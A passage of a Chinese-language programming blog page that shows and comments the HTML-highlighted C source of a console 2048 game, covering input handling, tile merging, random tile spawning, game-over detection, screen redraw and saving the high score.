&amp;key_code, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;<span class="comment">//避免多输 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> key_code;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="开始游戏"><a href="#开始游戏" class="headerlink" title="开始游戏"></a>开始游戏</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop_game</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> cmd = read_keyboard(); <span class="comment">/* 接收标准输入流字符命令 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 判断是否准备退出游戏 */</span></span><br><span class="line">        <span class="keyword">if</span> (if_prepare_exit) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cmd == <span class="string">'y'</span> || cmd == <span class="string">'Y'</span>) &#123;</span><br><span class="line">                <span class="comment">/* 退出游戏，清屏后退出 */</span></span><br><span class="line">                clear_screen();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd == <span class="string">'n'</span> || cmd == <span class="string">'N'</span>) &#123;</span><br><span class="line">                <span class="comment">/* 取消退出 */</span></span><br><span class="line">                if_prepare_exit = <span class="number">0</span>;</span><br><span class="line">                refresh_show();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 判断是否已经输掉游戏 */</span></span><br><span class="line">        <span class="keyword">if</span> (if_game_over) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cmd == <span class="string">'y'</span> || cmd == <span class="string">'Y'</span>) &#123;</span><br><span class="line">                <span class="comment">/* 重玩游戏 */</span></span><br><span class="line">                reset_game();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd == <span class="string">'n'</span> || cmd == <span class="string">'N'</span>) &#123;</span><br><span class="line">                <span class="comment">/* 退出游戏，清屏后退出  */</span></span><br><span class="line">                clear_screen();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if_need_add_num = <span class="number">0</span>; <span class="comment">/* 先设定不默认需要生成随机数，需要时再设定为1 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">        <span class="comment">/* 命令解析，w，s，a，d字符代表上下左右命令，q代表退出 */</span></span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">75</span>:move_left();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">80</span>:move_down();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">72</span>:move_up();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">77</span>:move_right();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'q'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">27</span>:if_prepare_exit = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:<span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        <span class="comment">/* 命令解析，上下左右箭头代表上下左右命令，q代表退出 */</span></span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_LEFT:move_left();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_DOWN:move_down();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_UP:move_up();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_RIGHT:move_right();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_QUIT:if_prepare_exit = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:<span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">/* 打破得分纪录 */</span></span><br><span class="line">        <span class="keyword">if</span> (score &gt; best) &#123;</span><br><span class="line">            best = score;</span><br><span class="line">            FILE *fp = fopen(config_path, <span class="string">"w"</span>);</span><br><span class="line">            <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">                fwrite(&amp;best, <span class="keyword">sizeof</span>(best), <span class="number">1</span>, fp);</span><br><span class="line">                fclose(fp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 默认为需要生成随机数时也同时需要刷新显示，反之亦然 */</span></span><br><span class="line">        <span class="keyword">if</span> (if_need_add_num) &#123;</span><br><span class="line">            add_rand_num();</span><br><span class="line">            refresh_show();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (if_prepare_exit) &#123;</span><br><span class="line">            refresh_show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序运行图:</p>
<p><img src="./1.png" alt="图2-13"></p>
<h4 id="重置游戏"><a href="#重置游戏" class="headerlink" title="重置游戏"></a>重置游戏</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset_game</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    score = <span class="number">0</span>;</span><br><span class="line">    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">    if_game_over = <span class="number">0</span>;</span><br><span class="line">    if_prepare_exit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 了解到游戏初始化时出现的两个数一定会有个2，所以先随机生成一个2，其他均为0 */</span></span><br><span class="line">    <span class="keyword">int</span> n = rand() % <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            board[i][j] = (n-- == <span class="number">0</span> ? <span class="number">2</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 前面已经生成了一个2，这里再生成一个随机的2或者4，概率之比9:1 */</span></span><br><span class="line">add_rand_num();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 在这里刷新界面并显示的时候，界面上已经默认出现了两个数字，其他的都为空（值为0） */</span></span><br><span class="line">    refresh_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="生成随机数-1"><a href="#生成随机数-1" class="headerlink" title="生成随机数"></a>生成随机数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rand_num</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>) time(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">int</span> n = rand() % get_null_count(); <span class="comment">/* 确定在何处空位置生成随机数 */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">/* 定位待生成的位置 */</span></span><br><span class="line">            <span class="keyword">if</span> (board[i][j] == <span class="number">0</span> &amp;&amp; n-- == <span class="number">0</span>) &#123;</span><br><span class="line">                board[i][j] = (rand() % <span class="number">10</span> ? <span class="number">2</span> : <span class="number">4</span>); <span class="comment">/* 生成数字2或4，生成概率为9:1 */</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="游戏结束"><a href="#游戏结束" class="headerlink" title="游戏结束"></a>游戏结束</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_game_over</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">/* 横向和纵向比较挨着的两个元素是否相等，若有相等则游戏不结束 */</span></span><br><span class="line">            <span class="keyword">if</span> (board[i][j] == board[i][j + <span class="number">1</span>] || board[j][i] == board[j + <span class="number">1</span>][i]) &#123;</span><br><span class="line">                if_game_over = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if_game_over = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序运行图:</p>
<p><img src="./2.png" alt="图2-14"></p>
<h4 id="上下左右的移动-这里只举例左移-其他三种移动方式只有遍历不同"><a href="#上下左右的移动-这里只举例左移-其他三种移动方式只有遍历不同" class="headerlink" title="上下左右的移动(这里只举例左移,其他三种移动方式只有遍历不同)"></a>上下左右的移动(这里只举例左移,其他三种移动方式只有遍历不同)</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_left</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 变量i用来遍历行项的下标，并且在移动时所有行相互独立，互不影响 */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">/* 变量j为列下标，变量k为待比较（合并）项的下标，循环进入时k&lt;j */</span></span><br><span class="line">        <span class="keyword">int</span> j, k;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>, k = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[i][j] &gt; <span class="number">0</span>) <span class="comment">/* 找出k后面第一个不为空的项，下标为j，之后分三种情况 */</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][k] == board[i][j]) &#123;</span><br><span class="line">                    <span class="comment">/* 情况1：k项和j项相等，此时合并方块并计分 */</span></span><br><span class="line">                    score += board[i][k++] *= <span class="number">2</span>;</span><br><span class="line">                    board[i][j] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>; <span class="comment">/* 需要生成随机数和刷新界面 */</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[i][k] == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">/* 情况2：k项为空，则把j项赋值给k项，相当于j方块移动到k方块 */</span></span><br><span class="line">                    board[i][k] = board[i][j];</span><br><span class="line">                    board[i][j] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* 情况3：k项不为空，且和j项不相等，此时把j项赋值给k+1项，相当于移动到k+1的位置 */</span></span><br><span class="line">                    board[i][++k] = board[i][j];</span><br><span class="line">                    <span class="keyword">if</span> (j != k) &#123;</span><br><span class="line">                        <span class="comment">/* 判断j项和k项是否原先就挨在一起，若不是则把j项赋值为空（值为0） */</span></span><br><span class="line">                        board[i][j] = <span class="number">0</span>;</span><br><span class="line">                        if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="清屏-减少闪烁"><a href="#清屏-减少闪烁" class="headerlink" title="清屏(减少闪烁)"></a>清屏(减少闪烁)</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear_screen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 重设光标输出位置清屏可以减少闪烁，system("cls")为备用清屏命令，均为Windows平台相关*/</span></span><br><span class="line">    COORD pos = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);</span><br><span class="line">    CONSOLE_CURSOR_INFO info = &#123;<span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="刷新界面"><a href="#刷新界面" class="headerlink" title="刷新界面"></a>刷新界面</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">refresh_show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    clear_screen();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"                  GAME: 2048     SCORE: %05d     BEST: %06d\n"</span>, score, best);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"               --------------------------------------------------"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 绘制方格和数字 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n                             ┌────┬────┬────┬────┐\n"</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                             │"</span>);</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"  %d │"</span>, board[i][j]);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[i][j] &lt; <span class="number">100</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" %d │"</span>, board[i][j]);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[i][j] &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" %d│"</span>, board[i][j]);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[i][j] &lt; <span class="number">10000</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%4d│"</span>, board[i][j]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">int</span> n = board[i][j];</span><br><span class="line">                    <span class="keyword">int</span> k;</span><br><span class="line">                    <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt; <span class="number">20</span>; ++k) &#123;</span><br><span class="line">                        n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"2^%02d│"</span>, k); <span class="comment">/* 超过四位的数字用2的幂形式表示，如2^13形式 */</span></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"    │"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n                             ├────┼────┼────┼────┤\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n                             └────┴────┴────┴────┘\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"               --------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"                  [W]:UP [S]:DOWN [A]:LEFT [D]:RIGHT [Q]:EXIT"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (get_null_count() == <span class="number">0</span>) &#123;</span><br><span class="line">        check_game_over();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 判断是否输掉游戏 */</span></span><br><span class="line">        <span class="keyword">if</span> (if_game_over) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\r                      GAME OVER! TRY THE GAME AGAIN? [Y/N]:     \b\b\b\b"</span>);</span><br><span class="line">            CONSOLE_CURSOR_INFO info = &#123;<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">            SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;info); <span class="comment">/* 重置光标位置 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 判断是否准备退出游戏 */</span></span><br><span class="line">    <span class="keyword">if</span> (if_prepare_exit) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\r                   DO YOU REALLY WANT TO QUIT THE GAME? [Y/N]:   \b\b"</span>);</span><br><span class="line">        CONSOLE_CURSOR_INFO info = &#123;<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">            SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;info); <span class="comment">/* 重置光标位置 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fflush(<span class="number">0</span>); <span class="comment">/* 刷新输出缓冲区 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="初始化游戏"><a href="#初始化游戏" class="headerlink" title="初始化游戏"></a>初始化游戏</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_game</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"cls"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取游戏存档路径，Windows下放在C:\Users\UserName\AppData\Local\2048目录下 */</span></span><br><span class="line">    <span class="keyword">char</span> m_lpszDefaultDir[MAX_PATH];</span><br><span class="line">    <span class="keyword">char</span> szDocument[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(m_lpszDefaultDir, <span class="number">0</span>, _MAX_PATH);</span><br><span class="line">    LPITEMIDLIST pidl = <span class="literal">NULL</span>;</span><br><span class="line">    SHGetSpecialFolderLocation(<span class="literal">NULL</span>, CSIDL_LOCAL_APPDATA, &amp;pidl);</span><br><span class="line">    <span class="keyword">if</span> (pidl &amp;&amp; SHGetPathFromIDList(pidl, szDocument)) &#123;</span><br><span class="line">    GetShortPathName(szDocument, m_lpszDefaultDir, _MAX_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sprintf</span>(config_path, <span class="string">"%s\\2048"</span>, m_lpszDefaultDir);</span><br><span class="line">    <span class="keyword">if</span> (_access(config_path, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">    _mkdir(config_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sprintf</span>(config_path, <span class="string">"%s\\2048\\2048.dat"</span>, m_lpszDefaultDir);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读取游戏最高分数 */</span></span><br><span class="line">    FILE *fp = fopen(config_path, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        fread(&amp;best, <span class="keyword">sizeof</span>(best), <span class="number">1</span>, fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        best = <span class="number">0</span>;</span><br><span class="line">        fp = fopen(config_path, <span class="string">"w"</span>);</span><br><span class="line">        <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">            fwrite(&amp;best, <span class="keyword">sizeof</span>(best), <span class="number">1</span>, fp);</span><br><span class="line">            fclose(fp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    reset_game();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
